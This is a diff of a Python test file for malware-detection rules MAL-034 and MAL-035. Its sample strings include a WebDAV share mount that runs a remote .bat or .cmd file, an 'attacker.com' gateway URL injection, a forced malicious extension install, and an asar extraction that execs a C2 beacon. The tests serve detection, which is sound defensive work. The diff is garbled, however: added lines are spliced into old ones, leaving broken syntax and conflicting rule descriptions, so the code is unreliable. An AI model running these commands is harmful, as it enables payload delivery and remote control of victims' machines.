@@ -1123,11 +1123,16 @@ def test_new_patterns_2026_03_19() -> None:
     """Test rules added 2026-03-19: GlassWorm Chrome extension RAT, OpenClaw gatewayUrl injection."""
     compiled = load_compiled_builtin_rulepack()
     # MAL-034: GlassWorm Chrome extension force-install RAT
+    """Test rules added 2026-03-19: Click-Fix WebDAV, Electron app.asar C2."""
+    compiled = load_compiled_builtin_rulepack()
+
+    # MAL-034: Click-Fix WebDAV share mount and execute pattern
     mal034 = next((r for r in compiled.static_rules if r.id == "MAL-034"), None)
     assert mal034 is not None
     assert (
         mal034.pattern.search(
             "code --install-extension --force malicious.vsix"
+            r"net use Z: \\cloudflare.report@443\DavWWWRoot\forever\e\ && Z:\recovery.bat"
         )
         is not None
     )
@@ -1170,11 +1175,19 @@ def test_new_patterns_2026_03_19() -> None:
     # Negative: normal extension install without --force
     assert mal034.pattern.search("code --install-extension myext") is None
     # MAL-035: OpenClaw gatewayUrl parameter injection and approval bypass
+            r"net use W: \\happyglamper.ro\webdav /persistent:no && start W:\fix.cmd"
+        )
+        is not None
+    )
+    assert mal034.pattern.search("net use Z: /delete") is None
+
+    # MAL-035: Trojanized Electron app.asar C2 payload injection
     mal035 = next((r for r in compiled.static_rules if r.id == "MAL-035"), None)
     assert mal035 is not None
     assert (
         mal035.pattern.search(
             "gatewayUrl=https://attacker.com"
+            "asar.extractAll('app.asar', './app'); exec('node ./app/c2-beacon.js')"
         )
         is not None
     )
@@ -1210,3 +1223,8 @@ def test_new_patterns_2026_03_19() -> None:
     )
     # Negative: normal gateway URL reference
     assert mal035.pattern.search("the gateway is running on port 8080") is None
+            "require('asar'); exec('payload')"
+        )
+        is not None
+    )
+    assert mal035.pattern.search("npm install electron") is None
